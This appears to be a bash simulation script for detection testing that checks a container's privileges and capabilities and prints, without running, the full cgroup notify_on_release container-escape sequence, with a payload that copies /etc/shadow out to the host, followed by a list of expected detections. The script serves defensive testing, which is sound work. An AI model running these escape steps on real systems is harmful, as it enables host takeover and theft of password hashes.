#!/bin/bash
# Attack: Privileged Container Escape
# MITRE ATT&CK: Privilege Escalation - T1611
# Severity: CRITICAL
# Description: Demonstrates container escape from privileged mode using cgroup notify_on_release
# Prerequisites: Container must be running in privileged mode

set -e
echo "[+] Starting: Privileged Container Escape"
echo "[+] MITRE ATT&CK: T1611 - Escape to Host"
echo "[+] Severity: CRITICAL"
echo ""

echo "[*] Step 1: Checking if container is privileged..."
if [ -c /dev/kmsg ]; then
    echo "[+] Container appears to be privileged (has /dev/kmsg)"
else
    echo "[!] Container does not appear privileged"
    echo "[!] Run with: --privileged flag"
fi

echo ""
echo "[*] Step 2: Checking capabilities..."
if command -v capsh &> /dev/null; then
    echo "[*] Current capabilities:"
    capsh --print | grep Current
else
    echo "[*] Checking via /proc/self/status:"
    grep Cap /proc/self/status
fi

echo ""
echo "[*] Step 3: Exploit technique - cgroup notify_on_release..."
echo "[*] This exploit abuses the cgroup notify_on_release mechanism"
echo "[*] When enabled, kernel executes release_agent when cgroup becomes empty"

echo ""
echo "[*] Step 4: Setting up exploit..."
echo "[*] Would execute the following:"
echo ""
echo "    # Create cgroup"
echo "    mkdir /tmp/cgrp"
echo "    mount -t cgroup -o memory cgroup /tmp/cgrp"
echo "    mkdir /tmp/cgrp/x"
echo ""
echo "    # Enable notify_on_release"
echo "    echo 1 > /tmp/cgrp/x/notify_on_release"
echo ""
echo "    # Set malicious release_agent"
echo "    host_path=\$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)"
echo "    echo \"\$host_path/cmd\" > /tmp/cgrp/release_agent"
echo ""
echo "    # Create payload on host filesystem"
echo "    echo '#!/bin/sh' > /cmd"
echo "    echo 'cat /etc/shadow > /output' >> /cmd"
echo "    chmod a+x /cmd"
echo ""
echo "    # Trigger release_agent"
echo "    sh -c \"echo \$\$ > /tmp/cgrp/x/cgroup.procs\""

echo ""
echo "[*] Step 5: Checking for host filesystem access..."
if [ -d /host ]; then
    echo "[+] Host filesystem possibly mounted at /host"
    ls -la /host/ | head -5
fi

echo ""
echo "[*] Step 6: Alternative escape - device access..."
echo "[*] Privileged containers have access to host devices:"
ls -la /dev/ | grep -E "sda|nvme|vda" | head -5 || echo "[*] No block devices found"

echo ""
echo "[✓] Privileged container escape simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Exploit cgroup notify_on_release mechanism"
echo "    - Write malicious release_agent script"
echo "    - Execute arbitrary commands on host"
echo "    - Read/write host filesystem"
echo "    - Install backdoor on host"
echo ""
echo "[!] Expected detections:"
echo "    - Privileged container execution"
echo "    - cgroup manipulation"
echo "    - Mount operations"
echo "    - Suspicious release_agent modification"
